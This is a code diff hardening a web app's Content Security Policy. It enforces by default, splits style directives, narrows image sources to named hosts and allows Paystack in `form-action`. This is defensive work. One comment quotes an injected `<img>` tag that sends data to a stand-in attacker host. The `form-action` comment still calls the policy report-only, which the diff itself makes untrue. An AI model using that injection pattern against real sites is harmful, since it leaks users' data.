@@ -21,20 +21,56 @@ import { SUPABASE_URL } from "../supabase/env";
  * injected `<script>` in a listing description, a review, a support message or
  * an agent's own listing title carries no nonce and does not execute.
  *
- * ## It ships in report-only first, and that is not timidity
+ * ## It shipped report-only, and it now enforces by default
  *
  * A CSP that is wrong does not degrade, it deletes: a missed directive means a
- * blank page or a dead checkout, and the report is the only way to find the
- * ones nobody predicted. So `CSP_ENFORCE` decides the header name and defaults
- * to report-only. Report-only cannot break anything by construction, browsers
- * still report every violation to `/api/csp-report`, and flipping to enforce is
- * one environment variable once the reports are quiet. There is no second
- * policy to keep in step, because both modes serve the same string.
+ * blank page or a dead checkout, and the report was the only way to find the
+ * ones nobody predicted. So this shipped as `Content-Security-Policy-Report-Only`
+ * behind `CSP_ENFORCE === "true"`, which nobody ever set.
+ *
+ * That is the failure mode of a report-only policy nobody flips: it looks like
+ * a control on every audit, in every header dump and in every screenshot, and
+ * it has never blocked a single thing. A report-only policy is documentation.
+ * The default is now the other way round, so a deployment that sets nothing
+ * gets the protection, and turning it back off is a deliberate act somebody has
+ * to write down.
+ *
+ * What was checked before flipping, rather than assumed, because the cost of
+ * being wrong here is a white screen:
+ *
+ *  - Every inline script the app writes is nonced. Two in `app/layout.tsx`
+ *    (theme, save-data) and the JSON-LD block on the listing page, plus every
+ *    inline script Next itself emits for hydration and streaming. Counted in
+ *    the browser, on a production build, in `tests/csp.spec.mjs`.
+ *  - No route emits a `<style>` element, so `style-src-elem` can stay at
+ *    `'self'` and only the `style=` attribute needs the inline allowance.
+ *  - Nothing frames us and we frame nothing, so both frame directives are
+ *    `'none'`.
+ *  - The only cross-origin subresources are basemap tiles, Unsplash stock,
+ *    Google avatars and Supabase storage, all of them images.
+ *  - The only cross-origin NAVIGATION a form can reach is Paystack checkout.
+ *    The Google and Apple sign-in rows that used to post to a server action
+ *    ending in a redirect to Supabase authorize are gone from `AuthChoices`,
+ *    so no provider origin belongs in `form-action`. If those rows ever come
+ *    back, the Supabase origin has to come back with them or Chrome kills the
+ *    sign in at the redirect: it applies `form-action` to the whole chain.
+ *
+ * There is no second policy to keep in step, because both modes serve the same
+ * string, so a deployment that hits something unforeseen can set
+ * `CSP_ENFORCE=false`, read the `[csp]` lines, and come back.
  */
 
-/** Set to the literal "true" to enforce. Anything else, including a typo, reports. */
+/**
+ * Enforcing unless somebody explicitly asks for reports instead.
+ *
+ * Fail closed. The old spelling was `=== "true"`, which meant an unset variable,
+ * a typo, a missing entry in a new environment or a value of "TRUE" all landed
+ * on report-only, and report-only is indistinguishable from no policy at all to
+ * an attacker. Only the literal "false" steps back to reporting now, so the
+ * accident cases all fail towards the protection.
+ */
 export function cspEnforced(): boolean {
-  return process.env.CSP_ENFORCE === "true";
+  return process.env.CSP_ENFORCE !== "false";
 }
 
 export function cspHeaderName(): string {
@@ -83,6 +119,47 @@ function supabaseOrigins(): string[] {
 }
 
 /**
+ * Every host this platform loads a picture from, as CSP sources.
+ *
+ * Kept in step with the `images.remotePatterns` allowlist in `next.config.ts`
+ * by hand, because the two lists are read by different runtimes and there is
+ * no shared module either of them can import. A host added there and forgotten
+ * here shows a broken image; a host added here and forgotten there throws a
+ * 500 out of the image optimiser. The second failure is louder, which is the
+ * right way round.
+ *
+ * The Supabase storage origin is NOT in this list. It is added at call time
+ * from `supabaseOrigins()`, so it follows the project URL rather than being
+ * written down twice.
+ */
+const IMAGE_HOSTS: readonly string[] = [
+  // Stock photography used by editorial surfaces.
+  "https://images.unsplash.com",
+  // The avatar a Google account already has. Google picks the shard, lh3
+  // through lh6, so the wildcard is on the subdomain and nothing wider.
+  "https://*.googleusercontent.com",
+  // Basemap raster tiles. Both providers, because which one is drawn depends
+  // on whether NEXT_PUBLIC_MAPTILER_KEY is set at runtime. See lib/maps/tiles.
+  "https://basemaps.cartocdn.com",
+  "https://api.maptiler.com",
+];
+
+/**
+ * Where a payment is allowed to take somebody.
+ *
+ * Read by `form-action`, and by nothing else: no Paystack script runs in this
+ * app and no browser code calls their API, so these origins are not in
+ * `script-src` or `connect-src` and must not be added there without a reason
+ * written down beside them.
+ */
+const PAYSTACK_ORIGINS: readonly string[] = [
+  "https://checkout.paystack.com",
+  "https://checkout.paystack.co",
+  "https://standard.paystack.co",
+  "https://paystack.com",
+];
+
+/**
  * The policy, for one request.
  *
  * Every directive below is either the strictest value that works or carries the
@@ -110,30 +187,85 @@ export function contentSecurityPolicy(nonce: string): string {
 
     /*
      * `'unsafe-inline'` for styles, honestly labelled rather than quietly
-     * omitted. React writes every `style={{...}}` prop as an inline attribute
-     * and Next inlines critical CSS during streaming, so removing this breaks
-     * the rendering of most of the app. It is a far smaller risk than the
-     * script equivalent: CSS injection can restyle a page, it cannot read a
-     * card number or call an API.
+     * omitted. React writes every `style={{...}}` prop as an inline attribute,
+     * so removing this breaks the rendering of most of the app. It is a far
+     * smaller risk than the script equivalent: CSS injection can restyle a
+     * page, it cannot read a card number or call an API.
+     *
+     * This directive is the FALLBACK now, not the rule. It stays as written
+     * because a browser that does not implement `style-src-elem` reads this
+     * one for everything, and on such a browser the choice is this allowance
+     * or an unstyled product.
      */
     ["style-src", ["'self'", "'unsafe-inline'"]],
 
     /*
-     * Images are the one place a wildcard is correct. Partner hotel photos come
-     * from LiteAPI, which serves each property's pictures from whichever CDN
-     * that supplier uses, so the host set is not knowable at build time and
-     * changes per hotel. `https:` allows any image over TLS and nothing else:
-     * `data:` for inline placeholders and `blob:` for a photo being previewed
-     * before upload. It cannot execute.
+     * And the half of the allowance that can be taken back, taken back.
+     *
+     * `style-src` above covers two very different things. A `style=` attribute
+     * on an element React rendered is unavoidable. A whole injected `<style>`
+     * block is not, and it is the dangerous one: it can draw a fake sign-in
+     * over the real page, hide the amount above a Pay button, or read the
+     * document through attribute selectors on a nonce or a CSRF field.
+     *
+     * Splitting them costs nothing here because nothing needs the element
+     * form. Measured on a production build rather than reasoned about: a
+     * `<style>` count across seventeen routes, signed out, returned zero on
+     * every one of them. Stylesheets arrive as `<link>` elements, which this
+     * directive also governs and which are same origin.
+     *
+     * A browser that understands this directive stops honouring
+     * `'unsafe-inline'` for elements and keeps honouring it for attributes,
+     * which is exactly the split we want. One that does not understand it
+     * falls back to `style-src` and is no worse off than before.
      */
-    ["img-src", ["'self'", "data:", "blob:", "https:"]],
+    ["style-src-elem", ["'self'"]],
+
+    /*
+     * Images used to be `https:`, a wildcard over every host on the web, and
+     * exactly one thing justified it: LiteAPI served each partner hotel's
+     * photos from whichever CDN that supplier happened to use, so the host set
+     * was genuinely unknowable at build time.
+     *
+     * There are no partner photos any more. Every image on this platform now
+     * comes from a host we can name, so the wildcard is closed and the list is
+     * the real one. It is the same set `next.config.ts` allows `next/image` to
+     * optimise, plus the two basemap providers, which serve raster tiles as
+     * plain `<img>` elements and are therefore governed by this directive
+     * rather than by `connect-src`.
+     *
+     * A photo that fails to load is a grey tile. A wildcard that stays open
+     * because nobody revisited it is an exfiltration channel: an injected
+     * `<img src="https://attacker/?=...">` is a GET to anywhere, carrying
+     * whatever the URL was built from.
+     */
+    ["img-src", ["'self'", "data:", "blob:", ...IMAGE_HOSTS, ...supabase]],
+
+    /*
+     * Walkthrough video, from the same places a photo comes from.
+     *
+     * Without this directive `media-src` falls back to `default-src 'self'`,
+     * and the walkthrough player is the one surface where that is about to
+     * matter: `listing_videos` is already joined into the listing detail read
+     * and its rows point at Supabase storage. The day somebody renders the
+     * `<video>` element, an enforcing policy would show a black box with no
+     * server-side trace, and the CSP would be suspected last.
+     *
+     * Named now, while the cost of naming it is nothing: these are the same
+     * origins `img-src` already trusts, for the same buckets, and no host is
+     * added that a listing photo could not already come from. `blob:` is here
+     * for the same reason it is in `img-src`, a chosen file previewed before
+     * it is uploaded.
+     */
+    ["media-src", ["'self'", "blob:", ...supabase]],
 
     // Self-hosted faces only, and `data:` for nothing. See public/fonts.
     ["font-src", ["'self'"]],
 
-    // The browser talks to us and to Supabase. Nothing else, including no
-    // partner API: every provider call in lib/inventory is server side, and
-    // this directive is what would catch it if one ever stopped being.
+    // The browser talks to us and to Supabase, and to nothing else at all.
+    // Every payment call is server side, so Paystack does not belong here:
+    // if a browser ever starts calling an API directly, this directive is
+    // what reports it.
     ["connect-src", ["'self'", ...supabase]],
 
     // No plugins, no applets, ever.
@@ -151,12 +283,32 @@ export function contentSecurityPolicy(nonce: string): string {
     ["base-uri", ["'self'"]],
 
     /*
-     * Forms post to us and to nowhere else. Paystack is reached by NAVIGATION
-     * to an authorization_url rather than by a cross-origin form post, so the
-     * checkout is unaffected by this; if that ever changes to a posted form,
-     * this directive is what will report it before it silently breaks.
+     * `'self'` alone here was a live bug waiting on one environment variable.
+     *
+     * The old note said Paystack is reached by NAVIGATION to an
+     * authorization_url rather than by a cross-origin form post, so
+     * `form-action 'self'` could not affect the checkout. That is half right
+     * and the wrong half is the one that breaks wallet funding. The deposit
+     * flow submits a form to our own route, and that route answers with a
+     * redirect to Paystack. Chrome applies `form-action` to the ENTIRE
+     * redirect chain a form submission follows, not only to its first hop, so
+     * a same-origin POST that redirects off site is blocked by `'self'` just
+     * as a cross-origin POST would be. Firefox does not do this, which is
+     * exactly how a bug like this reaches production: it works on the machine
+     * of whoever tested it.
+     *
+     * Nothing is wrong today only because `CSP_ENFORCE` is unset and the
+     * policy is report-only. The day it is set to "true", every deposit dies
+     * at the redirect with a console error and no server-side trace. So the
+     * Paystack origins are named now, while the cost of being wrong is a
+     * report rather than a dead checkout.
+     *
+     * Both TLDs are listed because Paystack has used both: older integrations
+     * are redirected to `checkout.paystack.com` and newer ones to
+     * `checkout.paystack.co`, the choice is made by their API rather than by
+     * us, and an authorization_url is opaque to this codebase.
      */
-    ["form-action", ["'self'"]],
+    ["form-action", ["'self'", ...PAYSTACK_ORIGINS]],
 
     // A service worker is registered (public/sw.js), and it may be created
     // from a blob by the framework's own loader.
